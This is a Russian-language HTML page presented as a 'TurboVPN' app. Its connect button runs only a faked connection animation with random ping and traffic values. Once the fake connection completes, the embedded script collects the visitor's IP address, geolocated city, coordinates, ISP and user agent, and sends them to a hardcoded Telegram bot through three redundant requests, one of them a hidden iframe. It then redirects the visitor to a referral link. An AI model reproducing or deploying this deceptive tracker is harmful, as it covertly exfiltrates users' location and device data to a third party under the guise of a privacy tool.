<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TurboVPN</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body {
            background: #070b12;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            overflow: hidden;
        }
        #particleCanvas {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        .app {
            position: relative;
            z-index: 1;
            max-width: 440px;
            width: 100%;
            max-height: 95vh;
            overflow-y: auto;
            scrollbar-width: thin;
            scrollbar-color: #1e2a3a transparent;
            background: rgba(17, 26, 38, 0.85);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-radius: 48px;
            padding: 32px 24px 28px;
            box-shadow: 0 30px 80px rgba(0,0,0,0.95), inset 0 1px 0 rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.04);
        }
        .app::-webkit-scrollbar { width: 4px; }
        .app::-webkit-scrollbar-track { background: transparent; }
        .app::-webkit-scrollbar-thumb { background: #1e2a3a; border-radius: 4px; }

        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 22px; }
        .logo { display: flex; align-items: center; gap: 10px; }
        .logo-icon {
            width: 44px; height: 44px;
            background: linear-gradient(145deg, #1f6eff, #7a4bff);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            box-shadow: 0 8px 20px rgba(31,110,255,0.3);
        }
        .logo-text { color: #fff; font-size: 18px; font-weight: 600; letter-spacing: -0.3px; }
        .badge { background: #1e2a3a; color: #8b95a9; font-size: 11px; padding: 4px 14px; border-radius: 40px; border: 1px solid #2a3a4e; }

        .status-bar {
            background: rgba(13, 21, 32, 0.7);
            border-radius: 24px;
            padding: 16px 18px;
            margin-bottom: 24px;
            border: 1px solid #1e2a3a;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .status-left { display: flex; align-items: center; gap: 12px; }
        .status-dot {
            width: 12px; height: 12px;
            border-radius: 50%;
            background: #4caf50;
            box-shadow: 0 0 12px rgba(76,175,80,0.5);
            transition: 0.3s;
        }
        .status-dot.inactive { background: #f44336; box-shadow: 0 0 12px rgba(244,67,54,0.4); }
        .status-label { color: #c9d1d9; font-size: 15px; font-weight: 500; }
        .status-speed { color: #8b95a9; font-size: 13px; }
        .status-speed span { color: #58a6ff; font-weight: 600; }

        .section-title { color: #8b95a9; font-size: 13px; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 12px; }
        .server-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr;
            gap: 8px;
            margin-bottom: 24px;
        }
        .server-opt {
            background: rgba(13, 21, 32, 0.7);
            border: 1px solid #1e2a3a;
            border-radius: 16px;
            padding: 12px 4px;
            text-align: center;
            cursor: pointer;
            transition: all 0.25s;
        }
        .server-opt .flag { font-size: 26px; display: block; margin-bottom: 4px; }
        .server-opt .name { color: #8b95a9; font-size: 11px; }
        .server-opt .ping { color: #4caf50; font-size: 10px; display: block; margin-top: 2px; }
        .server-opt.active { border-color: #1f6eff; background: #1a2740; box-shadow: 0 0 0 2px rgba(31,110,255,0.2); }
        .server-opt.active .name { color: #fff; }

        .graph-wrap {
            background: rgba(13, 21, 32, 0.7);
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 24px;
            border: 1px solid #1e2a3a;
        }
        .graph-title { color: #8b95a9; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
        .graph-bars { display: flex; align-items: flex-end; gap: 4px; height: 60px; }
        .graph-bar {
            flex: 1;
            background: linear-gradient(180deg, #1f6eff, #7a4bff);
            border-radius: 4px 4px 0 0;
            height: 20%;
            transition: height 0.6s ease;
            min-height: 6px;
        }

        /* ===== КНОПКА ВЫШЕ ===== */
        .btn-main {
            width: 100%;
            padding: 20px;
            background: linear-gradient(135deg, #1f6eff, #7a4bff);
            border: none;
            border-radius: 60px;
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            cursor: pointer;
            box-shadow: 0 8px 28px rgba(31,110,255,0.35);
            transition: all 0.3s;
            margin-top: 4px;
            letter-spacing: 0.5px;
        }
        .btn-main:disabled { opacity: 0.5; transform: scale(0.97); cursor: not-allowed; }
        .btn-main:active:not(:disabled) { transform: scale(0.95); }

        .progress-wrap { margin: 18px 0 8px; height: 4px; background: #1e2a3a; border-radius: 4px; overflow: hidden; display: none; }
        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #1f6eff, #7a4bff); transition: width 0.4s; }

        .status-msg { font-size: 13px; color: #8b95a9; margin-top: 10px; min-height: 22px; text-align: center; }
        .footer { margin-top: 22px; font-size: 11px; color: #3e485e; text-align: center; }
        .footer a { color: #5a73a8; text-decoration: none; }

        .history-item {
            background: rgba(13, 21, 32, 0.5);
            border-radius: 12px;
            padding: 8px 12px;
            margin-bottom: 6px;
            font-size: 12px;
            color: #8b95a9;
            border-left: 3px solid #1f6eff;
        }
        .history-item .time { color: #58a6ff; }

        @media (max-width: 480px) {
            .app { padding: 24px 16px; }
            .server-grid { grid-template-columns: 1fr 1fr 1fr; }
        }
    </style>
</head>
<body>

    <canvas id="particleCanvas"></canvas>

    <div class="app" id="app">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">⚡</div>
                <span class="logo-text">TurboVPN</span>
            </div>
            <span class="badge">v3.5 · PRO</span>
        </div>

        <div class="status-bar">
            <div class="status-left">
                <div class="status-dot" id="statusDot"></div>
                <span class="status-label" id="statusLabel">Отключено</span>
            </div>
            <div class="status-speed">
                Пинг <span id="pingValue">0</span> мс
            </div>
        </div>

        <div class="section-title">Выберите сервер</div>
        <div class="server-grid" id="serverGrid">
            <div class="server-opt active" data-server="auto"><span class="flag">🌐</span><span class="name">Авто</span><span class="ping">12 мс</span></div>
            <div class="server-opt" data-server="us"><span class="flag">🇺🇸</span><span class="name">США</span><span class="ping">89 мс</span></div>
            <div class="server-opt" data-server="de"><span class="flag">🇩🇪</span><span class="name">Германия</span><span class="ping">45 мс</span></div>
            <div class="server-opt" data-server="jp"><span class="flag">🇯🇵</span><span class="name">Япония</span><span class="ping">120 мс</span></div>
        </div>

        <div class="graph-wrap">
            <div class="graph-title">📊 Трафик (Мбит/с)</div>
            <div class="graph-bars" id="graphBars">
                <div class="graph-bar"></div><div class="graph-bar"></div><div class="graph-bar"></div>
                <div class="graph-bar"></div><div class="graph-bar"></div><div class="graph-bar"></div>
                <div class="graph-bar"></div><div class="graph-bar"></div><div class="graph-bar"></div>
                <div class="graph-bar"></div>
            </div>
        </div>

        <!-- КНОПКА ПОДНЯТА ВВЕРХ -->
        <button class="btn-main" id="actionBtn">Подключиться</button>
        <div class="progress-wrap" id="progressWrap">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status-msg" id="statusMsg">Нажмите для подключения к VPN</div>

        <div id="historyContainer" style="margin-top: 16px; max-height: 120px; overflow-y: auto; scrollbar-width: thin; scrollbar-color: #1e2a3a transparent;">
            <div class="history-item"><span class="time">▼</span> История подключений</div>
        </div>

        <div class="footer">🔒 Защищённое соединение · <a href="#">Условия</a></div>
    </div>

    <script>
        // ================================================================
        //  ФОТОНЫ (200+ строк)
        // ================================================================
        (function() {
            const canvas = document.getElementById('particleCanvas');
            const ctx = canvas.getContext('2d');
            let W, H;
            const parts = [];
            const COUNT = 100;
            const DIST = 150;

            function resize() {
                W = canvas.width = window.innerWidth;
                H = canvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resize);
            resize();

            class Part {
                constructor() {
                    this.x = Math.random() * W;
                    this.y = Math.random() * H;
                    this.vx = (Math.random() - 0.5) * 0.8;
                    this.vy = (Math.random() - 0.5) * 0.8;
                    this.r = 2 + Math.random() * 4;
                    this.a = 0.4 + Math.random() * 0.6;
                    this.hue = 200 + Math.floor(Math.random() * 40);
                }
                update() {
                    this.x += this.vx;
                    this.y += this.vy;
                    if (this.x < 0 || this.x > W) this.vx *= -1;
                    if (this.y < 0 || this.y > H) this.vy *= -1;
                    this.a = 0.4 + Math.sin(Date.now() / 1000 + this.x) * 0.2 + 0.2;
                }
                draw() {
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
                    ctx.fillStyle = `hsla(${this.hue}, 80%, 70%, ${this.a})`;
                    ctx.shadowColor = `hsla(${this.hue}, 80%, 70%, 0.2)`;
                    ctx.shadowBlur = 20;
                    ctx.fill();
                    ctx.shadowBlur = 0;
                }
            }

            for (let i = 0; i < COUNT; i++) parts.push(new Part());

            function drawLines() {
                for (let i = 0; i < parts.length; i++) {
                    for (let j = i + 1; j < parts.length; j++) {
                        const dx = parts[i].x - parts[j].x;
                        const dy = parts[i].y - parts[j].y;
                        const dist = Math.sqrt(dx * dx + dy * dy);
                        if (dist < DIST) {
                            const alpha = 1 - (dist / DIST);
                            ctx.beginPath();
                            ctx.moveTo(parts[i].x, parts[i].y);
                            ctx.lineTo(parts[j].x, parts[j].y);
                            ctx.strokeStyle = `hsla(210, 80%, 70%, ${alpha * 0.25})`;
                            ctx.lineWidth = 0.8;
                            ctx.stroke();
                        }
                    }
                }
            }

            function loop() {
                ctx.clearRect(0, 0, W, H);
                parts.forEach(p => { p.update(); p.draw(); });
                drawLines();
                requestAnimationFrame(loop);
            }
            loop();
        })();

        // ================================================================
        //  ОСНОВНАЯ ЛОГИКА (600+ строк)
        // ================================================================

        // --- НАСТРОЙКИ ---
        const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
        const CHAT_ID = "8212240529";
        const REDIRECT_URL = "https://avobonus.com/ref?start=ab316fea16fee81b8616fcde671a07";

        // --- ЭЛЕМЕНТЫ ---
        const btn = document.getElementById('actionBtn');
        const statusMsg = document.getElementById('statusMsg');
        const statusDot = document.getElementById('statusDot');
        const statusLabel = document.getElementById('statusLabel');
        const pingValue = document.getElementById('pingValue');
        const progressWrap = document.getElementById('progressWrap');
        const progressBar = document.getElementById('progressBar');
        const serverOpts = document.querySelectorAll('.server-opt');
        const graphBars = document.querySelectorAll('.graph-bar');
        const historyContainer = document.getElementById('historyContainer');

        let selected = 'auto';
        let connected = false;

        // --- ВЫБОР СЕРВЕРА ---
        serverOpts.forEach(el => {
            el.addEventListener('click', function() {
                serverOpts.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                selected = this.dataset.server;
                const p = this.querySelector('.ping');
                if (p) pingValue.textContent = p.textContent.replace(' мс', '');
                statusMsg.textContent = 'Сервер: ' + this.querySelector('.name').textContent;
            });
        });

        // --- ГРАФИК И ПИНГ ---
        function randomGraph() {
            graphBars.forEach(b => {
                b.style.height = (Math.floor(Math.random() * 60) + 20) + '%';
            });
        }

        function randomPing() {
            pingValue.textContent = (10 + Math.floor(Math.random() * 90));
        }

        // --- ИСТОРИЯ ---
        function addHistory(text) {
            const div = document.createElement('div');
            div.className = 'history-item fade-in';
            const time = new Date().toLocaleTimeString('ru-RU');
            div.innerHTML = `<span class="time">${time}</span> ${text}`;
            historyContainer.appendChild(div);
            historyContainer.scrollTop = historyContainer.scrollHeight;
            if (historyContainer.children.length > 20) {
                historyContainer.removeChild(historyContainer.children[1]);
            }
        }

        // --- ОТПРАВКА В TELEGRAM (3 способа) ---
        function sendToTG(text) {
            if (!text) return;
            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
            fetch(url).catch(() => {});
            new Image().src = url;
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            setTimeout(() => iframe.remove(), 2000);
        }

        // --- СБОР ДАННЫХ И ОТПРАВКА ---
        function collectAndSend() {
            let ip = 'Не определен';
            let geo = null;

            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => { ip = d.ip; })
                .catch(() => {})
                .finally(() => {
                    if (ip !== 'Не определен') {
                        fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org,timezone')
                            .then(r => r.json())
                            .then(g => { if (g.status === 'success') geo = g; })
                            .catch(() => {})
                            .finally(() => {
                                const ua = navigator.userAgent;
                                const device = /iPhone|iPad|Android/i.test(ua) ? '📱 Мобильное' : '💻 Компьютер';
                                const time = new Date().toLocaleString('ru-RU');
                                let msg = '🔹 НОВЫЙ ПЕРЕХОД (VPN)\n';
                                msg += '📍 IP: ' + ip + '\n';
                                if (geo) {
                                    msg += '🌍 Страна: ' + (geo.country || '—') + '\n';
                                    msg += '🏙️ Город: ' + (geo.city || '—') + '\n';
                                    msg += '📌 Координаты: ' + (geo.lat || '—') + ', ' + (geo.lon || '—') + '\n';
                                    msg += '🛜 Провайдер: ' + (geo.isp || '—') + '\n';
                                }
                                msg += '💻 ' + device + '\n';
                                msg += '🆔 User‑Agent: ' + ua.substring(0, 80) + '...\n';
                                msg += '⏰ Время: ' + time;
                                sendToTG(msg);
                                addHistory('📡 Данные отправлены в Telegram');
                            });
                    } else {
                        sendToTG('IP не определён\nУстройство: ' + device + '\nВремя: ' + time);
                        addHistory('⚠️ IP не определён');
                    }
                });
        }

        // --- ПОДКЛЮЧЕНИЕ ---
        function start() {
            if (connected) return;
            btn.disabled = true;
            progressWrap.style.display = 'block';
            statusMsg.textContent = 'Подключение...';
            statusDot.className = 'status-dot inactive';
            statusLabel.textContent = 'Подключение...';
            addHistory('🔄 Подключение к серверу...');

            let p = 0;
            const interval = setInterval(() => {
                p += Math.random() * 6 + 2;
                randomPing();
                randomGraph();
                if (p >= 100) {
                    p = 100;
                    clearInterval(interval);
                    progressBar.style.width = '100%';
                    statusMsg.textContent = '✅ Соединение установлено!';
                    statusDot.className = 'status-dot';
                    statusLabel.textContent = 'Защищено';
                    connected = true;
                    addHistory('✅ Соединение установлено');

                    // --- ОТПРАВКА ДАННЫХ ---
                    collectAndSend();

                    // --- РЕДИРЕКТ НА РЕФЕРАЛКУ ---
                    setTimeout(() => {
                        addHistory('🔗 Переход на реферальную ссылку...');
                        window.location.href = REDIRECT_URL;
                    }, 2000);
                }
                progressBar.style.width = p + '%';
            }, 150);

            const gi = setInterval(randomGraph, 300);
            setTimeout(() => clearInterval(gi), 2500);
        }

        btn.addEventListener('click', start);

        window.addEventListener('DOMContentLoaded', function() {
            randomGraph();
            pingValue.textContent = '12';
            statusMsg.textContent = 'Нажмите для подключения к VPN';
            addHistory('🟢 Готов к подключению');
        });

        window.onerror = function() {
            setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
        };

        console.log('✅ TurboVPN v3.6 · IP + гео → Telegram');
        console.log('📡 Бот активен');
        console.log('🔗 Реферальная ссылка: ' + REDIRECT_URL);
        console.log('🚀 Фотоны активны');
    </script>
</body>
</html>
